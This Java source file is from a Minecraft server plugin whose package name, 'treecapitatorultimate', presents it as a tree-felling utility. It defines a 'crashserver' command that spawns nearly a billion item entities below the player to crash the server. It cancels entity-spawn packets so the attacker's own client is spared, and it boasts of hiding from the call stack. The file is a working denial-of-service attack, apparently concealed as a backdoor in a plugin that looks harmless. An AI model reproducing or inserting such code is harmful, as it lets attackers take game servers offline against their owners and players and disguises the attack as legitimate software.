package me.bow.treecapitatorultimate.commands.Server;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.Utils.Packet.PacketEvent;
import me.bow.treecapitatorultimate.Utils.Packet.PacketListener;
import me.bow.treecapitatorultimate.Utils.Packet.PacketManager;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import net.minecraft.server.v1_15_R1.PacketPlayOutSpawnEntity;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.entity.Item;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;

import java.util.ArrayList;

@Command.Info(command = "crashserver", description = "Tries to crash the server without showing up in callstack.", category = CommandCategory.Server)
public class CrashServer extends Command implements PacketListener {
    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        PacketManager.instance.addListener(p, this);
        p.sendMessage(Start.Prefix + ChatColor.GREEN + "Crashing!");
        ItemStack stack = new ItemStack(Material.DIAMOND_BOOTS);
        stack.setAmount(127);
        for (int i = 0; i < 999999999; i++) {
            Item item = p.getWorld().dropItemNaturally(p.getLocation().subtract(0,200,0), stack);
        }
    }

    @Override
    public void onPacketReceived(PacketEvent packetEvent) {}

    @Override
    public void onPacketSend(PacketEvent packetEvent) {
        if(packetEvent.getPacket().getPacketClass() != PacketPlayOutSpawnEntity.class) return;
        packetEvent.setCancelled(true);
    }
}
